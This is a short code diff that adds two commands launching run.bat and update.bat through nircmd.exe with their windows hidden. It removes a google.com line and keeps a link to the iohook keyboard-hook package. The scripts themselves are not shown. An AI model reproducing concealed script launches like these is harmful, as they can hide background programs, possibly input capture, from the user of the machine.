@@ -1,3 +1,5 @@
-"www.google.com" 
+%HOMEDRIVE%/client/client/nircmd.exe exec hide run.bat
+%HOMEDRIVE%/client/client/nircmd.exe exec hide update.bat
+
 @REM exit /b 0
 https://www.npmjs.com/package/iohook
